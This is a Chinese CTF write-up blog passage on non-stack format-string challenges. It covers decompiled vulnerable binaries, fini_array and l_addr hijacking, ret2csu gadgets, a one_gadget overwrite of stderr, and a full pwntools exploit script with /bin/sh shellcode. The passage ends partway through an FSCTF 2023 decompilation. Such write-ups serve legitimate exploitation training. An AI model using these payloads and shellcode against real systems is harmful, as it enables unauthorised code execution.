<h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Ch4r1l3&#x27;s printf test&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your gift: %p\n&quot;</span>, v3);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现给了栈的地址，然后关闭了标准输出流，又有一个非栈上的格式化字符串漏洞（0x601060）（buff拉满了（bushi</p>
<p>这题考到一个小trick：</p>
<p>exit会调用<code>dl_fini</code>函数，我们看看<code>dl_fini</code>函数的源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115390" alt="img"></p>
<p>会发现执行的时候调用(l-&gt;l_addr+l-&gt;l_info[DY_FINI_ARRAY]-&gt;d_un.d_ptr)，本来l-&gt;l_addr为0，而l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr指针指向程序中的fini_array段的地址，也就是l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr的值为0x0000000000600DD8</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115391.png" alt="image-20240512224201859" style="zoom:33%;" />

<p>这时就通过覆盖I-&gt;I_addr来劫持fini_array的地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115392.png" alt="image-20240513202751753"></p>
<p>执行exit中的调用函数（发现雀氏</p>
<p>发现栈上<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115393.png" alt="image-20240512224609287"></p>
<p>有个I-&gt;I_addr的地址，就可以通过改这个地址上的值来偏移</p>
<blockquote>
<p>其中可以通过看这个与众不同的颜色可以知道这是来自于ld.so文件里的，而这个地址为什么恰好出现在栈上可能是因为在exit函数中，会通过这个来调用dl_fini函数</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115394.png" alt="image-20240512224709178"></p>
<p>通过fmtarg查偏移（问就是懒（bushi</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =tbs(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(read_addr)</span><br></pre></td></tr></table></figure>

<p>通过这个便可以二次利用read了</p>
<p>而第二次的printf得到的栈空间有着成堆的rop链，非常好的进行构造</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115395.png" alt="image-20240513195457206"></p>
<p>1和2指向的都是栈空间，能实现在栈空间的任意写，而2能实现printf_loop，或者rip的任意写</p>
<p>有了任意写之后就要用ROP来getshell了</p>
<p>（在此发现这题的exp有点复杂，因此只做思路上的利用，就不打了（等之后再次遇到相似的题目再进行利用≧ ﹏ ≦</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115396.png" alt="image-20240513200455427"></p>
<p>在libc_csu_init中可以控制rbx rbp r12 r13 r14 r15</p>
<p>然后有一个rop</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     <span class="section">[rbp+48h]</span>, edx</span><br></pre></td></tr></table></figure>

<p>它的作用是将exp+[rbp+48h]的值之后存储在rbp+48h中（最神奇的地方，第一次利用这种rop</p>
<p>而其中的edx和rbp都是可以控制的，所以我们就可以实现一次任意写。</p>
<p>可以看到程序空间里存在stderr,stdin,stdout，它们都指向libc，所以可以修改它们为one_gadget来getshell。</p>
<p>在关闭aslr的情况下stderr和one_gadget分别为：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stderr</span> = <span class="number">0</span>x601040  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line"><span class="attr">one</span>= <span class="number">0</span>x7ffff7afe147<span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br></pre></td></tr></table></figure>

<p>计算偏移修改即可。</p>
<p>修改完之后再次利用ret2csu传stderr的地址给r12，**最后调用call qword ptr [r12+rbx*8]**拿到shell。</p>
<p>（非常好的思路让我大脑旋转</p>
<p>附上完整exp ：（<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183859#h2-0">from</a>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pdbg.local(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.23&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">switch=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> switch==<span class="number">1</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">2</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">3</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line"><span class="comment">#elf=pdbg.elf</span></span><br><span class="line"><span class="comment">#libc=pdbg.libc</span></span><br><span class="line">sh_x86_18=<span class="string">&quot;x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    pop_rsp=<span class="number">0x40082d</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;This is your gift: &#x27;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#if stack&amp;0xffff&gt;0x2000:</span></span><br><span class="line">    <span class="comment">#   p.close()</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line">    payload1=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span></span><br><span class="line">    payload1=payload1.ljust(<span class="number">16</span>,<span class="string">&#x27;x00&#x27;</span>)+p64(<span class="number">0x4007A3</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload1)</span><br><span class="line">    bp([<span class="number">0x4007c1</span>])</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    stack_tail=(stack-<span class="number">280</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x48</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x48</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload3)</span><br><span class="line">    <span class="comment">#get arbitray write</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)  <span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)<span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10a0</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">2</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">2</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># merge heap and ROP</span></span><br><span class="line">    prbp = <span class="number">0x400690</span> <span class="comment">#pop rbp;ret;</span></span><br><span class="line">    prsp = <span class="number">0x40082d</span> <span class="comment">#pop rsp r13 r14 r15 ;ret</span></span><br><span class="line">    adc = <span class="number">0x4006E8</span>  </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    adc    DWORD PTR [rbp+0x48],edx</span></span><br><span class="line"><span class="string">    mov    ebp,esp</span></span><br><span class="line"><span class="string">    call   0x400660 &lt;deregister_tm_clones&gt;</span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov    eax,0x601017</span></span><br><span class="line"><span class="string">    push   rbp</span></span><br><span class="line"><span class="string">    sub    rax,0x601010</span></span><br><span class="line"><span class="string">    cmp    rax,0xe</span></span><br><span class="line"><span class="string">    mov    rbp,rsp</span></span><br><span class="line"><span class="string">    jbe    0x400690 </span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    ret   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    arsp = <span class="number">0x0400848</span> <span class="comment">#add    rsp,0x8;ret</span></span><br><span class="line">    prbx = <span class="number">0x40082A</span> <span class="comment">#pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line">    call = <span class="number">0x400810</span> <span class="comment">#mov    rdx,r13</span></span><br><span class="line">                    <span class="comment">#mov    rsi,r14</span></span><br><span class="line">                    <span class="comment">#mov    edi,r15d</span></span><br><span class="line">                    <span class="comment">#call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line">    stderr = <span class="number">0x601040</span>  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line">    one= <span class="number">0x7ffff7afe147</span><span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br><span class="line">    rop=<span class="number">0x6010a0</span></span><br><span class="line">    payload6 = p64(arsp)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#                   rbx   rbp      r12     r13    r14 r15</span></span><br><span class="line">    payload6 += flat(prbx,<span class="number">0</span>,stderr-<span class="number">0x48</span>,rop,<span class="number">0xFFD2BC07</span>,<span class="number">0</span>,  <span class="number">0</span>,  call)</span><br><span class="line">    payload6 += flat(adc,<span class="number">0</span>,prbx,<span class="number">0</span>,<span class="number">0</span>,stderr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x400819</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x82d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">    payload5=payload5.ljust(<span class="number">0x40</span>,<span class="string">&#x27;x00&#x27;</span>)+payload6</span><br><span class="line"></span><br><span class="line">    <span class="comment">#bp([0x4007c1])</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="d3ctf-2019-unprintablev"><a href="#d3ctf-2019-unprintablev" class="headerlink" title="d3ctf_2019_unprintablev"></a>d3ctf_2019_unprintablev</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115397.png" alt="image-20240513200949187"></p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115398.png" alt="image-20240513201206567"></p>
<p>禁掉了execve</p>
<p>实力不济（先鸽了</p>
<h1 id="第六届强网拟态线下赛-fmt"><a href="#第六届强网拟态线下赛-fmt" class="headerlink" title="[第六届强网拟态线下赛]fmt"></a>[第六届强网拟态线下赛]fmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115399.png" alt="image-20240512212119545"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个栈的后四位地址，然后还有一个非栈上的格式化字符串漏洞（一头雾水</p>
<p>实力不济（先鸽了</p>
<h1 id="FSCTF-2023-YS-START"><a href="#FSCTF-2023-YS-START" class="headerlink" title="[FSCTF 2023]YS,START!"></a>[FSCTF 2023]YS,START!</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115400.png" alt="image-20240513225857029"></p>
<p>这题目比较阴间的地方就是不能反汇编，但是有点玄学，就是把ret undefine掉就可以反汇编了，不理解但是大为震撼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [esp-F6h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-F2h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-EEh] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-EAh] [ebp-138h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-E6h] [ebp-134h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-E2h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// 